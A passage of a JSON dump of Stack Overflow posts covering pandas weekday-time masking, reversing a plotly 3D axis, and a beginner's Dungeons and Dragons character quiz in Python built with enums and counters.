calendar\n\n# The DatetimeIndex to selection from\nidx = pd.date_range('2019-01-01', '2019-01-31', freq='H')\n\n# Converts a datetime to a time-of-day fraction in [0, 1)\ndef datetime_to_time_frac(t):\n    return t.hour / 24 + t.minute / (24 * 60) + t.second / (24 * 60 * 60)\n\n# Converts a datetime to a float representing weekday (Monday: 0 to Sunday: 6) + time-of-day fraction in [0, 1)\ndef datetime_to_weekday_time_frac(t):\n    return t.weekday + datetime_to_time_frac(t)\n\n# DatetimeIndex converted to float\nidx_conv = datetime_to_weekday_time_frac(idx)\n\n# Boolean mask selecting items between Tuesday 20:00 and Friday 06:00\nmask = (idx_conv &gt;= calendar.TUESDAY + datetime_to_time_frac(time(20, 0)))\\\n     &amp; (idx_conv &lt;= calendar.FRIDAY + datetime_to_time_frac(time(6, 0)))\n\n# Validation of mask in a pivot table\ndf = pd.DataFrame(index=idx[mask])\ndf['Date'] = df.index.date\ndf['Weekday'] = df.index.weekday\nweekdays = list(calendar.day_abbr)\ndf['WeekdayName'] = df.Weekday.map(lambda x: weekdays[x])\ndf['Hour'] = df.index.hour\ndf.pivot_table(index=['Date', 'WeekdayName'], columns='Hour', values='Weekday', aggfunc='count')\n</code></pre>\n\n<p>The final pivoted output shows that the code does the right thing, but I have a feeling that there is a more elegant and idiomatic way to approach this problem.</p>\n\n<p><em>(Code is based on Python 3 with recent Pandas.)</em></p>\n\n<p><a href=\"https://i.stack.imgur.com/25cPR.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/25cPR.png\" alt=\"Pivoted final output for code validation\"></a></p>\n"}, {"tags": ["python", "plotly", "axis", "scatter", "plotly-python"], "answers": [{"comments": [{"owner": {"reputation": 2313, "user_id": 7375754, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/830f6d236ab0502a68fd9b9daf7f729f?s=128&d=identicon&r=PG&f=1", "display_name": "Jane Sully", "link": "https://stackoverflow.com/users/7375754/jane-sully"}, "edited": false, "score": 0, "creation_date": 1571874457, "post_id": 58532203, "comment_id": 103388231, "body": "I tried doing that but it didn&#39;t work. Not sure if this is it, but maybe that only works for 2d plots and not 3d scatterplots?"}, {"owner": {"reputation": 508, "user_id": 8446738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/973a32317f443520ef6ebb8b54289b20?s=128&d=identicon&r=PG&f=1", "display_name": "Elegant Code", "link": "https://stackoverflow.com/users/8446738/elegant-code"}, "reply_to_user": {"reputation": 2313, "user_id": 7375754, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/830f6d236ab0502a68fd9b9daf7f729f?s=128&d=identicon&r=PG&f=1", "display_name": "Jane Sully", "link": "https://stackoverflow.com/users/7375754/jane-sully"}, "edited": false, "score": 0, "creation_date": 1571875472, "post_id": 58532203, "comment_id": 103388410, "body": "@JaneSully, It should work for 3D plots: <a href=\"https://github.com/plotly/plotly.py/issues/803#issuecomment-432797559\" rel=\"nofollow noreferrer\">According to this</a> What happens when you try this?"}, {"owner": {"reputation": 2313, "user_id": 7375754, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/830f6d236ab0502a68fd9b9daf7f729f?s=128&d=identicon&r=PG&f=1", "display_name": "Jane Sully", "link": "https://stackoverflow.com/users/7375754/jane-sully"}, "edited": false, "score": 0, "creation_date": 1571886683, "post_id": 58532203, "comment_id": 103390361, "body": "Nothing -- it doesn&#39;t give an error but doesn&#39;t do anything helpful either."}, {"owner": {"reputation": 508, "user_id": 8446738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/973a32317f443520ef6ebb8b54289b20?s=128&d=identicon&r=PG&f=1", "display_name": "Elegant Code", "link": "https://stackoverflow.com/users/8446738/elegant-code"}, "reply_to_user": {"reputation": 2313, "user_id": 7375754, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/830f6d236ab0502a68fd9b9daf7f729f?s=128&d=identicon&r=PG&f=1", "display_name": "Jane Sully", "link": "https://stackoverflow.com/users/7375754/jane-sully"}, "edited": false, "score": 0, "creation_date": 1571888562, "post_id": 58532203, "comment_id": 103390717, "body": "@JaneSully Make sure you have plotly version newer than 3.4.0 as per <a href=\"https://github.com/plotly/plotly.py/issues/803#issuecomment-432853681\" rel=\"nofollow noreferrer\">here</a>"}, {"owner": {"reputation": 508, "user_id": 8446738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/973a32317f443520ef6ebb8b54289b20?s=128&d=identicon&r=PG&f=1", "display_name": "Elegant Code", "link": "https://stackoverflow.com/users/8446738/elegant-code"}, "reply_to_user": {"reputation": 2313, "user_id": 7375754, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/830f6d236ab0502a68fd9b9daf7f729f?s=128&d=identicon&r=PG&f=1", "display_name": "Jane Sully", "link": "https://stackoverflow.com/users/7375754/jane-sully"}, "edited": false, "score": 0, "creation_date": 1572369607, "post_id": 58532203, "comment_id": 103535170, "body": "@JaneSully, Any luck?"}], "tags": [], "owner": {"reputation": 508, "user_id": 8446738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/973a32317f443520ef6ebb8b54289b20?s=128&d=identicon&r=PG&f=1", "display_name": "Elegant Code", "link": "https://stackoverflow.com/users/8446738/elegant-code"}, "is_accepted": false, "score": 2, "last_activity_date": 1571873743, "last_edit_date": 1571873743, "creation_date": 1571873383, "answer_id": 58532203, "question_id": 58532088, "link": "https://stackoverflow.com/questions/58532088/how-to-switch-direction-of-axis-in-3d-scatterplot-plotly/58532203#58532203", "title": "How to switch direction of axis in 3D scatterplot plotly?", "body": "<p><a href=\"https://plot.ly/python/axes/#reversed-axes\" rel=\"nofollow noreferrer\">This</a> should do the trick:</p>\n\n<p><code>fig.update_xaxes(autorange=\"reversed\")</code></p>\n\n<p>Alternatively, you can reverse it with a specific range:</p>\n\n<p><code>fig.update_xaxes(range=[9, 3])</code></p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 6204057, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153719865302669/picture?type=large", "display_name": "Tanel Peet", "link": "https://stackoverflow.com/users/6204057/tanel-peet"}, "is_accepted": false, "score": 1, "last_activity_date": 1593783864, "last_edit_date": 1593783864, "creation_date": 1593592693, "answer_id": 62672879, "question_id": 58532088, "link": "https://stackoverflow.com/questions/58532088/how-to-switch-direction-of-axis-in-3d-scatterplot-plotly/62672879#62672879", "title": "How to switch direction of axis in 3D scatterplot plotly?", "body": "<p>For 3D plots, the options for axes are under <code>layout.scene</code>. <br>\nThe <code>autorange</code> option is therefore located under <code>layout.scene.xaxis.autorange</code> and can be modified like this:</p>\n<pre><code>fig.update_scenes(xaxis_autorange=&quot;reversed&quot;)\n</code></pre>\n<p>References:</p>\n<ul>\n<li><a href=\"https://plotly.com/python/3d-axes/\" rel=\"nofollow noreferrer\">python/3d-axes</a></li>\n<li><a href=\"https://plotly.com/python/reference/#layout-scene-xaxis-autorange\" rel=\"nofollow noreferrer\">python/layout-scene-xaxis-autorange</a></li>\n</ul>\n"}], "owner": {"reputation": 2313, "user_id": 7375754, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/830f6d236ab0502a68fd9b9daf7f729f?s=128&d=identicon&r=PG&f=1", "display_name": "Jane Sully", "link": "https://stackoverflow.com/users/7375754/jane-sully"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1110, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1593783864, "creation_date": 1571872401, "question_id": 58532088, "link": "https://stackoverflow.com/questions/58532088/how-to-switch-direction-of-axis-in-3d-scatterplot-plotly", "title": "How to switch direction of axis in 3D scatterplot plotly?", "body": "<p>I plotted the following using plotly and got the resulting plot shown before. X is the # of hours in a day, Y is a proportion between 0-1, and Z is a categorical variable with levels {0,1,2}. </p>\n\n<p>However, it's unclear why the X seems to be going the opposite direction of what we're used to with a 3D Cartesian place where it's down(-) and up(+), left(-) and right(+), and front(-) and back(+). However, X seems to decrease from front to back instead of increase. I am new to plotly and am not sure how to flip the axis so it goes from 0 to 1 instead of 1 to 0. I would greatly appreciate help on this!</p>\n\n<pre><code>fig = px.scatter_3d(X_combined, x='x', y='y', z='z',\n          color='set', symbol='predictions', opacity=0.7)\n\nfig.update_traces(marker=dict(size=12,\n                         line=dict(width=5,\n                         color='Black')),\n                  selector=dict(mode='markers'))\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/TEBxO.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/TEBxO.png\" alt=\"Plotly plot\"></a></p>\n"}, {"tags": ["python", "python-3.x", "random", "counter"], "comments": [{"owner": {"reputation": 2324, "user_id": 6144626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/w5zgz.jpg?s=128&g=1", "display_name": "Ari Cooper-Davis", "link": "https://stackoverflow.com/users/6144626/ari-cooper-davis"}, "edited": false, "score": 0, "creation_date": 1571872855, "post_id": 58532084, "comment_id": 103387927, "body": "Your ideas area good, you just need to google how lists work. <code>questions = [&#39;What is your name?&#39;, &#39;What is your favourite colour?&#39;, &#39;What is the air speed of a swallow?&#39;]</code> is a valid list. You can then choose questions by getting items from that list like this: <code>question[0]</code> which would return <code>What is your name?</code>."}, {"owner": {"reputation": 3, "user_id": 12265753, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDl1xEX2J2m3DsHQzH2AnjM50FrzWcm0bTi3MqV-fw=k-s128", "display_name": "Isaac Ostlund", "link": "https://stackoverflow.com/users/12265753/isaac-ostlund"}, "reply_to_user": {"reputation": 2324, "user_id": 6144626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/w5zgz.jpg?s=128&g=1", "display_name": "Ari Cooper-Davis", "link": "https://stackoverflow.com/users/6144626/ari-cooper-davis"}, "edited": false, "score": 0, "creation_date": 1571876031, "post_id": 58532084, "comment_id": 103388496, "body": "Awesome, thank you! That helps me get the list format down. How can i tie question[0] to its answers, and the numerous counter += 1 for each answer?"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 12265753, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDl1xEX2J2m3DsHQzH2AnjM50FrzWcm0bTi3MqV-fw=k-s128", "display_name": "Isaac Ostlund", "link": "https://stackoverflow.com/users/12265753/isaac-ostlund"}, "edited": false, "score": 0, "creation_date": 1571886064, "post_id": 58532516, "comment_id": 103390257, "body": "it is a little overwhelming but INCREDIBLY helpful. Thank you so much. I just spent the last hour digesting it all. If i want to be able to have a single answer increase multiple counters, is that possible? I&#39;m not sure how to set it to accept multiple &quot;character_type (or other attributes that i can make)&quot; after the text of a query. \u2013  EDIT: I think a simple &quot;and&quot; between multiple Character.type is working."}, {"owner": {"reputation": 3, "user_id": 12265753, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDl1xEX2J2m3DsHQzH2AnjM50FrzWcm0bTi3MqV-fw=k-s128", "display_name": "Isaac Ostlund", "link": "https://stackoverflow.com/users/12265753/isaac-ostlund"}, "edited": false, "score": 0, "creation_date": 1571930756, "post_id": 58532516, "comment_id": 103410416, "body": "How do i add another separate counter? You have a &quot;counter = Counter()&quot; line, and down at the bottom you have &quot;counter.update({user_choice.character_type})&quot; and &quot;character_type = counter.most_common(n=1)[0][0]&quot;  If i want to have the same thing but for another class of enums, like STR DEX or CON, or alignment (Choatic, Neutral, Lawful), how can i make it count those separate? @user1"}, {"owner": {"reputation": 3, "user_id": 12265753, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDl1xEX2J2m3DsHQzH2AnjM50FrzWcm0bTi3MqV-fw=k-s128", "display_name": "Isaac Ostlund", "link": "https://stackoverflow.com/users/12265753/isaac-ostlund"}, "edited": false, "score": 0, "creation_date": 1571958257, "post_id": 58532516, "comment_id": 103421169, "body": "I&#39;m not supposed to use comments to say thank you, but this is an insane amount of work and it is exactly what i needed. It makes perfect sense and is above and beyond what i expected. Thank you so much. @user1"}, {"owner": {"reputation": 7055, "user_id": 10987432, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wt3JW.png?s=128&g=1", "display_name": "Paul M.", "link": "https://stackoverflow.com/users/10987432/paul-m"}, "reply_to_user": {"reputation": 3, "user_id": 12265753, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mDl1xEX2J2m3DsHQzH2AnjM50FrzWcm0bTi3MqV-fw=k-s128", "display_name": "Isaac Ostlund", "link": "https://stackoverflow.com/users/12265753/isaac-ostlund"}, "edited": false, "score": 0, "creation_date": 1571964073, "post_id": 58532516, "comment_id": 103422297, "body": "No worries, glad it&#39;s helpful!"}], "tags": [], "owner": {"reputation": 7055, "user_id": 10987432, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wt3JW.png?s=128&g=1", "display_name": "Paul M.", "link": "https://stackoverflow.com/users/10987432/paul-m"}, "is_accepted": true, "score": 0, "last_activity_date": 1571935271, "last_edit_date": 1571935271, "creation_date": 1571876391, "answer_id": 58532516, "question_id": 58532084, "link": "https://stackoverflow.com/questions/58532084/making-an-in-depth-quiz-for-dungeons-and-dragons/58532516#58532516", "title": "Making an in depth &quot;quiz&quot; for Dungeons and Dragons", "body": "<p>I think using <code>random.sample</code> is a good way of picking random questions from a master list of questions. Here's what I came up with:</p>\n\n<p>The different character types have turned into an <code>enum</code> (enumeration). One big advantage of this approach is that it prevents you from \"stringifying\" things. Instead of hardcoding string-literals in your code any time you need to print or perform a comparison with a character type, you can use an enum instance instead.</p>\n\n<p>You have a <code>collections.Counter</code> (which, in our case, is really only a dictionary where the key is a <code>Character</code> enum instance, and the associated value is the point count or tally from the quiz). You don't have to use a <code>collections.Counter</code>, a plain python dictionary would do just as well. Either way it is preferable to creating lots of individual counter variables.</p>\n\n<p><code>queries</code> is a list of <code>Query</code> objects (a <code>Query</code> is what I've decided to call a question). This is basically your master list of all possible questions, any one of which can appear in the quiz later. A single <code>Query</code> object consists of a <code>prompt</code> string which represents the actual question to be asked. It also contains a list of <code>Choice</code> objects named <code>choices</code>. These represent all the possible valid choices / answers / response that the user is allowed to make in response to this query.</p>\n\n<p>A <code>Choice</code> object consists of some <code>text</code>, which is the text to be displayed, as well as a <code>character_type</code> variable, which is going to be a <code>Character</code> enum instance. If the user selects this choice, this enum instance will increment the associated count in the <code>counter</code> object.</p>\n\n<p>Both <code>Query</code> and <code>Choice</code> are just simple <code>collections.namedtuple</code>s, because I didn't feel like making classes for them.</p>\n\n<p>After defining the <code>queries</code> list comes the actual quiz. We pick some number of random queries from our <code>queries</code> list using <code>random.sample</code>, and then do the following for each query:</p>\n\n<ol>\n<li>Print the current query's prompt.</li>\n<li>Display all the available options for that query</li>\n<li>Get user input (enter a loop which only terminates if the user\nenters valid input).</li>\n<li>Increment the counter based on the user's choice.</li>\n<li>Start the loop over and do all that again for the next query until\nthere are no more randomly picked queries left.</li>\n</ol>\n\n<p>Finally, we print the result of the quiz. I realize you have a ton more character types, and even other attributes like strength and dexterity that I didn't even take into account. Hopefully this is useful and not overwhelming.</p>\n\n<pre><code>def main():\n\n    from enum import Enum, auto\n    from collections import Counter, namedtuple\n\n    from random import sample\n\n    class Character(Enum):\n        Barbarian = auto()\n        Bard = auto()\n        Cleric = auto()\n\n    counter = Counter()\n\n    Choice = namedtuple(\"Choice\", [\"text\", \"character_type\"])\n    Query = namedtuple(\"Query\", [\"prompt\", \"choices\"])\n\n    queries = [\n        Query(\"Battleaxe or Lute?\", [\n            Choice(\"Battleaxe (grunt)\", Character.Barbarian),\n            Choice(\"The Lute! Oh how I love singing!\", Character.Bard)]),\n        Query(\"Do you prefer healing people or singing to them?\", [\n            Choice(\"I prefer to heal people\", Character.Cleric),\n            Choice(\"I LOVE SINGING\", Character.Bard)]),\n        Query(\"Do you fight against Man or the Undead?\", [\n            Choice(\"Me fight Man (grunt)\", Character.Barbarian),\n            Choice(\"I prefer to fight the undead\", Character.Cleric)]),\n        Query(\"Sing and dance, heal people, or wage war?\", [\n            Choice(\"I'LL SING!!\", Character.Bard),\n            Choice(\"I'd prefer to heal people\", Character.Cleric),\n            Choice(\"Me wage war (ugh)\", Character.Barbarian)])\n    ]\n\n    number_of_random_queries = 3\n    for current_query in sample(queries, k=number_of_random_queries):\n        print(current_query.prompt)\n        for choice_index, choice in enumerate(current_query.choices, start=1):\n            print(f\"    {choice_index}.) {choice.text}\")\n        # Get user input, stay in this loop until they enter something valid.\n        while True:\n            user_input = input(\"Enter your choice: \")\n            try:\n                user_choice_index = int(user_input)-1\n                assert user_choice_index &gt;= 0\n                user_choice = current_query.choices[user_choice_index]\n            except (ValueError, AssertionError, KeyError):\n                # Either the input was not a number, or the number was an invalid index.\n                continue\n            else:\n                break\n        # Increment the counter / tally for the associated character type.\n        counter.update({user_choice.character_type})\n        print(\"-\" * 20)\n\n    # Print the final result.\n    character_type = counter.most_common(n=1)[0][0]\n    print(f\"You have the heart of a {character_type.name}.\")\n\n    return 0\n\n\nif __name__ == \"__main__\":\n    import sys\n    sys.exit(main())\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Sing and dance, heal people, or wage war?\n    1.) I'LL SING!!\n    2.) I'd prefer to heal people\n    3.) Me wage war (ugh)\nEnter your choice: 1\n--------------------\nDo you prefer healing people or singing to them?\n    1.) I prefer to heal people\n    2.) I LOVE SINGING\nEnter your choice: 2\n--------------------\nDo you fight against Man or the Undead?\n    1.) Me fight Man (grunt)\n    2.) I prefer to fight the undead\nEnter your choice: 2\n--------------------\nYou have the heart of a Bard.\n</code></pre>\n\n<p><strong>EDIT - Just thought I should edit this post, explain a few things and make my original answer less complex.</strong></p>\n\n<p>Forget all this <code>def main</code>, <code>collections.Counter</code> and <code>enum.auto</code> stuff for right now.</p>\n\n<p>Starting out, you may be tempted to write something like this (as you have):</p>\n\n<pre><code>barbarian_count = 0\nbard_count = 0\ncleric_count = 0\n\n# ...\n\nif barbarian_count &gt; bard_count and barbarian_count &gt; cleric_count:\n    print(\"You're a barbarian!\")\nelif bard_count &gt; barbarian_count and bard_count &gt; cleric_count:\n    print(\"You're a bard!\")\nelif cleric_count &gt; barbarian_count and cleric_count &gt; bard_count:\n    print(\"You're a cleric!\")\nelse:\n    # ...\n</code></pre>\n\n<p>Which is not bad - it's just not very easy to maintain and extend - maybe you've already discovered that. For example, this code only works for three unique character types (barbarian, bard and cleric). What if I want to add a new character type to the project? I'll have to change my code to this:</p>\n\n<pre><code>barbarian_count = 0\nbard_count = 0\ncleric_count = 0\ndruid_count = 0\n\n# ...\n\nif barbarian_count &gt; bard_count and barbarian_count &gt; cleric_count and barbarian_count &gt; druid_count:\n    print(\"You're a barbarian!\")\nelif bard_count &gt; barbarian_count and bard_count &gt; cleric_count and bard_count &gt; druid_count:\n    print(\"You're a bard!\")\nelif cleric_count &gt; barbarian_count and cleric_count &gt; bard_count and cleric_count &gt; druid_count:\n    print(\"You're a cleric!\")\nelif druid_count &gt; barbarian_count and druid_count &gt; bard_count and druid_count &gt; cleric_count:\n    print(\"You're a druid!\")\nelse:\n    # ...\n</code></pre>\n\n<p>I had to add a new counter variable, extend the conditions for all of my existing if-statements, and even add a whole new if-statement which is just as long as the others. You can imagine how things can quickly get out of hand if you try to add more character types using this approach. You may be tempted to copy-paste if-statements because you don't want to type everything manually, but in my experience that just leads to bugs in your code (because you might forget to change a variable name in one of the conditions, for example).</p>\n\n<p>That's why I suggest using an enum to define the possible character types. Just a quick introduction to enums:</p>\n\n<pre><code>from enum import Enum\n\nclass CharacterType(Enum):\n    Barbarian = 0\n    Bard = 1\n    Cleric = 2\n\nfor character_type in CharacterType:\n    print(character_type)\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>CharacterType.Barbarian\nCharacterType.Bard\nCharacterType.Cleric\n&gt;&gt;&gt; \n</code></pre>\n\n<p>You can see I've changed the name of the enum from <code>Character</code> to <code>CharacterType</code>, which I think is a bit more appropriate. This snippet is just meant to demonstrate that you can iterate over all possible enum states (in our case the unique character types) in a simple for-loop. These are not strings that are being printed in the for-loop by the way - <code>character_type</code> is an instance of a <code>CharacterType</code> enum.</p>\n\n<p>Take a look at the <code>CharacterType</code> enum. I'm setting <code>Barbarian = 0</code>, <code>Bard = 1</code> and <code>Cleric = 2</code>. These values don't have anything to do with the count or tally. These are just unique values - think of them as unique IDs. They don't even need to be integers - they could be anything, like strings:</p>\n\n<pre><code>from enum import Enum\n\nclass CharacterType(Enum):\n    Barbarian = \"Hello\"\n    Bard = \"World\"\n    Cleric = \"WUIAHkjahdkjsh893y724uhj\"\n\nfor character_type in CharacterType:\n    print(character_type)\n</code></pre>\n\n<p>If I run this code, I get the same exact output. The associated value to any one CharacterType just has to be a unique object - which is why it's common practice to simply number them starting at 0 or 1 (or use <code>enum.auto</code> which picks unique IDs for us).</p>\n\n<p>Now, I'd like to have a way of introducing some kind of counters or counter variables - one for each of my character types. Instead of creating separate variables, we can create a plain old python dictionary, where the key is the character type, and the associated value is the count or tally for that particular character type.</p>\n\n<pre><code>from enum import Enum\n\nclass CharacterType(Enum):\n    Barbarian = 0\n    Bard = 1\n    Cleric = 2\n\ncounter = {}\n\nfor character_type in CharacterType:\n    counter.update({character_type: 0})\n\nfor character_type, count in counter.items():\n    print(f\"The current count for {character_type.name} is {count}\")\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>The current count for Barbarian is 0\nThe current count for Bard is 0\nThe current count for Cleric is 0\n</code></pre>\n\n<p>Under our <code>CharacterType</code> enum we create an empty dictionary called <code>counter</code>. Then we have the same for-loop as before where we iterate over all the different character types in our enum. However, instead of printing the character types, we simply add new key-value pairs to our dictionary. Basically, we're just initializing our dictionary so that the count / tally for every single character type starts out at zero. The second for-loop is just there for us to verify that the dictionary has three key-value pairs - one for each character type, and that their associated values (counts) are zero.</p>\n\n<p>If you're interested in sticking with my initial approach for constructing the questions and responses, this is the part where you'd create the named tuples. Don't forget to <code>from collections import namedtuple</code> at the top of your code:</p>\n\n<pre><code>Query = namedtuple(\"Query\", [\"text\", \"choices\"])\nChoice = namedtuple(\"Choice\", [\"text\", \"character_types\"])\n\nqueries = [\n\n    Query(\n        text=\"Battleaxe or Lute?\",\n        choices=[\n\n            Choice(\n                text=\"Battleaxe (grunt)\",\n                character_types=[\n                    (CharacterType.Barbarian, 2),\n                    (CharacterType.Cleric, 1)\n                ]\n            ), # First choice ends here\n\n            Choice(\n                text=\"The Lute! Oh how I love singing!\",\n                character_types=[\n                    (CharacterType.Bard, 2)\n                ]\n            ) # Second choice ends here\n\n        ] # List of choices ends here\n    ), # First Query ends here\n\n    Query(\n        text=\"Do you prefer healing people or singing to them?\",\n        choices=[\n\n            Choice(\n                text=\"I prefer to heal people\",\n                character_types=[\n                    (CharacterType.Cleric, 1)\n                ]\n            ), # First choice ends here\n\n            Choice(\n                text=\"I LOVE SINGING\",\n                character_types=[\n                    (CharacterType.Bard, 2)\n                ]\n            ) # Second choice ends here\n        ] # List of choices ends here\n    ) # Second Query ends here\n] # List of all queries ends here\n</code></pre>\n\n<p>I've changed a few things. A Query has a <code>text</code> string (instead of a <code>prompt</code> string, I just changed the name), and a list of <code>Choice</code> objects named <code>choices</code>.</p>\n\n<p>A <code>Choice</code> object also has a <code>text</code> string. However, the property that used to be called <code>character_type</code> is now <code>character_types</code> - this indicates that this is meant to be a list of things, rather than on single thing. I made this change to support affecting the counts of multiple character types by selecting certain choices.</p>\n\n<p>Then there's the <code>queries</code> list, which is a list of <code>Query</code> objects. There's only two Query objects this time instead of four, because it would have taken a long time to type - it's just for demonstration. I've also added indentation where I think it might be helpful, just to see where one object begins and another ends. I know it might seem like we're not really saving much typing by using this approach, but a data-driven approach like this tends to pay off - doing a bit more typing before the actual interesting stuff happens can save us lots of headaches and typing later on.</p>\n\n<p>Take a look at the first <code>Choice</code> of the first <code>Query</code>, specifically the <code>character_types</code> property:</p>\n\n<pre><code>               character_types=[\n                    (CharacterType.Barbarian, 2),\n                    (CharacterType.Cleric, 1)\n                ]\n</code></pre>\n\n<p>This is different from what we were doing before. <code>character_types</code> is now a list of tuples. There are two tuples. The first element of each tuple is the character type that is affected, and the second element is an integer which is the value by which to increment the counter for that character type. In this case, selecting this choice would increment the Barbarian count by 2, and the Cleric count by 1. This is how we can support incrementing multiple counts by different values.</p>\n\n<p>Since you mentioned wanting a pool of 50 potential queries in the end, I would consider putting all of your questions in a separate text file (something like a JSON compliant format might be especially cute), just so that you're not writing this huge list right in your source code. Your code would then simply read the file during runtime and load the questions.</p>\n\n<p>Here's the rest of the code. Again, some things have changed - the number of random queries is set to just one, because I only have two in my pool of possible queries. I've added comments where I think they might be helpful, and I've used if-statements instead of exceptions to validate the input. Updating the counter has changed, too, since we're not using a <code>collections.Counter</code> object anymore, and also because we'd like to support updating multiple character type counters at once. The final step of determining which counter was the highest has also changed. Also, don't forget to do <code>from random import sample</code>.</p>\n\n<pre><code>number_of_random_queries = 1\nfor current_query in sample(queries, k=number_of_random_queries):\n\n    # Print the current query's text\n    print(current_query.text)\n\n    # Print all the available options for the current query\n    for choice_index, choice in enumerate(current_query.choices, start=1):\n        print(f\"    {choice_index}.) {choice.text}\")\n\n    # Get user input\n    while True:\n        user_input = input(\"Enter your choice: \")\n        if not user_input.isdigit():\n            # User input is not a number, ask them for input again\n            continue\n        user_choice_index = int(user_input)-1\n        if not (0 &lt;= user_choice_index &lt;= len(current_query.choices)-1):\n            # User input was a number, but it was an invalid index, ask them for input again\n            continue\n        user_choice = current_query.choices[user_choice_index]\n        # Terminate the input loop\n        break\n\n    # We now have the user's selection (Choice object). Now update the appropriate counter(s)\n    for character_type, increment_value in user_choice.character_types:\n        old_counter_value = counter[character_type]\n        new_counter_value = old_counter_value + increment_value\n        counter.update({character_type: new_counter_value})\n    print(\"-\" * 20)\n\n# The quiz for-loop is now over\n# Determine which counter has the highest value\n\ncharacter_type, value = max(counter.items(), key=lambda pair: pair[1])\nprint(f\"You have the heart of a {character_type.name} with {value} point(s)!\")\n</code></pre>\n\n<p>To summarize: Even though it doesn't seem like we've saved much typing, we actually have. You are now free to add as many unique character types to the <code>CharacterType</code> enum, and you will not have to make any other changes to the rest of your code - with the possible exception of the queries list, since you may want to add more questions for the new character types.</p>\n\n<p><strong>ONE MORE EDIT</strong> - I was trying to avoid having this get too dense - sorry about that. You have a single counter dictionary whose keys are enums and the associated values are dicionaries that do the actual counting.</p>\n\n<pre><code>from enum import Enum\nfrom collections import namedtuple\nfrom random import sample\n\n\nclass CharacterType(Enum):\n    Barbarian = 0\n    Bard = 1\n    Cleric = 2\n\nclass CharacterAttribute(Enum):\n    Strength = 0\n    Dexterity = 1\n    Intelligence = 2\n\nclass CharacterAlignment(Enum):\n    Chaotic = 0\n    Neutral = 1\n    Lawful = 2\n\ncounters = {}\n\nfor CharacterProperty in [CharacterType, CharacterAttribute, CharacterAlignment]:\n    counters.update({CharacterProperty: {}})\n    for character_property in CharacterProperty:\n        counters[CharacterProperty].update({character_property: 0})\n\nQuery = namedtuple(\"Query\", [\"text\", \"choices\"])\nChoice = namedtuple(\"Choice\", [\"text\", \"types\", \"attributes\", \"alignments\"])\n\nqueries = [\n\n    Query(\n        text=\"Battleaxe or Lute?\",\n        choices=[\n\n            Choice(\n                text=\"Battleaxe (grunt)\",\n                types=[\n                    (CharacterType.Barbarian, 2),\n                    (CharacterType.Cleric, 1)\n                ],\n                attributes=[\n                    (CharacterAttribute.Strength, 3),\n                    (CharacterAttribute.Dexterity, 1)\n                ],\n                alignments=[\n                    (CharacterAlignment.Chaotic, 1)\n                ]\n            ), # First choice ends here\n\n            Choice(\n                text=\"The Lute! Oh how I love singing!\",\n                types=[\n                    (CharacterType.Bard, 2)\n                ],\n                attributes = [\n                    (CharacterAttribute.Intelligence, 1)\n                ],\n                alignments = [\n                    (CharacterAlignment.Lawful, 4)\n                ]\n            ) # Second choice ends here\n\n        ] # List of choices ends here\n    ), # First Query ends here\n\n    Query(\n        text=\"Do you prefer healing people or singing to them?\",\n        choices=[\n\n            Choice(\n                text=\"I prefer to heal people\",\n                types=[\n                    (CharacterType.Cleric, 1)\n                ],\n                attributes=[\n                    (CharacterAttribute.Intelligence, 2)\n                ],\n                alignments=[\n                    (CharacterAlignment.Lawful, 2)\n                ]\n            ), # First choice ends here\n\n            Choice(\n                text=\"I LOVE SINGING\",\n                types=[\n                    (CharacterType.Bard, 2)\n                ],\n                attributes=[\n                    (CharacterAttribute.Intelligence, 2),\n                    (CharacterAttribute.Dexterity, 2)\n                ],\n                alignments=[\n                    (CharacterAlignment.Lawful, 1)\n                ]\n            ) # Second choice ends here\n        ] # List of choices ends here\n    ) # Second Query ends here\n] # List of all queries ends here\n\n\nnumber_of_random_queries = 1\nfor current_query in sample(queries, k=number_of_random_queries):\n\n    # Print the current query's text\n    print(current_query.text)\n\n    # Print all the available options for the current query\n    for choice_index, choice in enumerate(current_query.choices, start=1):\n        print(f\"    {choice_index}.) {choice.text}\")\n\n    # Get user input\n    while True:\n        user_input = input(\"Enter your choice: \")\n        if not user_input.isdigit():\n            # User input is not a number, ask them for input again\n            continue\n        user_choice_index = int(user_input)-1\n        if not (0 &lt;= user_choice_index &lt;= len(current_query.choices)-1):\n            # User input was a number, but it was an invalid index, ask them for input again\n            continue\n        user_choice = current_query.choices[user_choice_index]\n        # Terminate the input loop\n        break\n\n    # We now have the user's selection (Choice object). Now update the appropriate counter(s)\n    choice_lists = [user_choice.types, user_choice.attributes, user_choice.alignments]\n\n    for CharacterProperty, choice_list in zip(counters, choice_lists):\n        for character_property, increment_value in choice_list:\n   